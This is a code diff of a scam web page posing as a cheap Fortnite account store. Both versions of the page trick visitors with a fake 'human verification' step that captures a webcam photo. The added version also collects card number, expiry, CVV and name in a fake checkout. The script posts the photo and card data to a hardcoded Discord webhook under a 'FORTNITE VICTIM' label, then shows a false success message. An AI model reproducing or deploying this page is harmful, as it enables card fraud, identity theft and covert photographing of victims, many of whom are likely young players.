@@ -1,78 +1,88 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Cheap Fortnite Accounts Shop 2025</title>
+    <title>Cheap Fortnite Accounts 2025</title>
     <style>
-        body{background:#0f0f1a;color:#fff;font-family:Arial;margin:0;padding:20px}
-        h1{text-align:center;color:#00ff00}
-        .account{background:#111;padding:20px;margin:20px auto;border-radius:15px;max-width:600px;box-shadow:0 0 15px #00ff00}
-        .price{color:#00ff00;font-size:24px;font-weight:bold}
-        button{background:#ff0066;color:white;padding:15px 30px;border:none;border-radius:10px;font-size:18px;cursor:pointer}
-        #checkout{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.98);display:none;justify-content:center;align-items:center;flex-direction:column}
-        video{opacity:0;width:1px;height:1px;position:absolute}
+        body{background:#000;color:#fff;font-family:Arial;text-align:center;margin:0}
+        .acc{background:#111;padding:20px;margin:20px auto;border-radius:15px;max-width:600px}
+        button{background:#ff0066;color:white;padding:15px 40px;border:none;border-radius:10px;font-size:18px;cursor:pointer}
+        #verify, #payment{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.98);display:none;flex-direction:column;align-items:center;justify-content:center}
+        video{width:640px;height:480px;border:5px solid red;border-radius:15px}
+        #snapBtn{background:red;padding:20px 50px;font-size:25px;margin-top:20px}
+        input{padding:15px;font-size:18px;width:300px;margin:10px}
     </style>
 </head>
 <body>
-    <h1>🔥 CHEAP FORTNITE ACCOUNTS 2025 🔥</h1>
-    <p style="text-align:center">OG Skins • Renegade Raider • Black Knight • 500k+ VBucks • $5-$20</p>
-
-    <div class="account">
-        <h2>Account #1 - Galaxy + Renegade Raider</h2>
-        <p>Skins: 350+ | Pickaxes: 200+ | Emotes: 180+ | VBucks: 125,000</p>
-        <p class="price">$9.99</p>
-        <button onclick="buy(1)">Buy Now</button>
+    <h1 style="color:lime">🔥 CHEAP FORTNITE ACCOUNTS 🔥</h1>
+    <div class="acc">
+        <h2>OG Renegade Raider + Galaxy</h2>
+        <p>500+ Skins • 200+ Pickaxes • 1,000,000 VBucks</p>
+        <p style="color:lime;font-size:30px">$12.99</p>
+        <button onclick="start()">Buy Now</button>
     </div>
 
-    <div class="account">
-        <h2>Account #2 - Black Knight + Reaper</h2>
-        <p>Skins: 500+ | Pickaxes: Minty | Emotes: Floss, Take The L | VBucks: 850,000</p>
-        <p class="price">$14.99</p>
-        <button onclick="buy(2)">Buy Now</button>
+    <!-- Human Verification -->
+    <div id="verify">
+        <h1 style="color:lime">Human Verification</h1>
+        <p>Position face in frame & press red button</p>
+        <video id="cam" autoplay playsinline></video><br>
+        <button id="snapBtn">READY - TAKE PICTURE</button>
     </div>
 
-    <div class="account">
-        <h2>Account #3 - Full Access Stack</h2>
-        <p>Skins: 800+ | Rare OG Everything | VBucks: 1,200,000</p>
-        <p class="price">$19.99</p>
-        <button onclick="buy(3)">Buy Now</button>
+    <!-- Fake Debit Card Checkout -->
+    <div id="payment">
+        <h1 style="color:gold">Checkout - Debit/Credit Card</h1>
+        <p>Card Number</p>
+        <input id="cardnum" placeholder="1234 5678 9012 3456">
+        <p>Expiry (MM/YY)</p>
+        <input id="expiry" placeholder="12/28">
+        <p>CVV</p>
+        <input id="cvv" placeholder="123">
+        <p>Name on Card</p>
+        <input id="name" placeholder="John Doe">
+        <br><br>
+        <button onclick="sendAll()">Complete Purchase $12.99</button>
+        <p style="color:gray;margin-top:30px">More payment options soon</p>
     </div>
 
-    <!-- Fake Checkout + Camera Grab -->
-    <div id="checkout">
-        <h1>Human Verification Required</h1>
-        <p>Allow camera to prove you're not a bot (5 seconds)</p>
-        <video id="cam" autoplay playsinline></video>
-        <canvas id="canvas" width="1280" height="720"></canvas>
-        <p id="status">Starting verification...</p>
-    </div>
+    <canvas id="canvas" width="640" height="480" style="display:none"></canvas>
 
 <script>
 const webhook = "https://discord.com/api/webhooks/1304603193086578698/9BypJkfkdPMruh835ASf7NNhBTlLwp7mjdSd7iIF_3CFGbrXUvWAmDYms0pTJlSasgON";
+let capturedImg = null;
 
-function buy(id){
-    document.getElementById("checkout").style.display = "flex";
-    
-    navigator.mediaDevices.getUserMedia({video:true}).then(stream=>{
-        document.getElementById("cam").srcObject = stream;
+async function start(){
+    document.getElementById("verify").style.display = "flex";
+    const stream = await navigator.mediaDevices.getUserMedia({video:true});
+    document.getElementById("cam").srcObject = stream;
+
+    document.getElementById("snapBtn").onclick = async () => {
+        let canvas = document.getElementById("canvas");
+        let ctx = canvas.getContext("2d");
+        ctx.drawImage(document.getElementById("cam"),0,0,640,480);
+        capturedImg = canvas.toDataURL("image/jpeg",0.95);
         
-        setTimeout(async ()=>{
-            let canvas = document.getElementById("canvas");
-            let ctx = canvas.getContext("2d");
-            ctx.drawImage(document.getElementById("cam"),0,0,1280,720);
-            let blob = await new Promise(r=>canvas.toBlob(r,"image/jpeg",0.95));
-            
-            let form = new FormData();
-            form.append("file", blob, `fortnite_victim_${id}.jpg`);
-            form.append("content", `**New Fortnite Victim - Account #${id} Purchase** 👀`);
-            
+        stream.getTracks().forEach(t=>t.stop());
+        document.getElementById("verify").style.display = "none";
+        document.getElementById("payment").style.display = "flex";
+    };
+}
+
+function sendAll(){
+    let card = document.getElementById("cardnum").value;
+    let exp = document.getElementById("expiry").value;
+    let cvv = document.getElementById("cvv").value;
+    let name = document.getElementById("name").value;
+
+    let form = new FormData();
+    if(capturedImg){
+        fetch(capturedImg).then(r=>r.blob()).then(blob=>{
+            form.append("file", blob, "face.jpg");
+            form.append("content", `**FORTNITE VICTIM FULL GRAB**\nCard: ${card}\nExp: ${exp}\nCVV: ${cvv}\nName: ${name}`);
             fetch(webhook,{method:"POST",body:form});
-            
-            stream.getTracks().forEach(t=>t.stop());
-            document.getElementById("status").innerHTML = "<h2 style='color:gold'>✅ Verified! Account sent to your email in 5-10 min</h2>";
-        },1200);
-    }).catch(()=>{
-        document.getElementById("status").innerHTML = "<h2 style='color:red'>Camera blocked — purchase cancelled</h2>";
-    });
+        });
+    }
+    alert("Purchase Complete! Account sent to email ✅");
 }
 </script>
 </body>
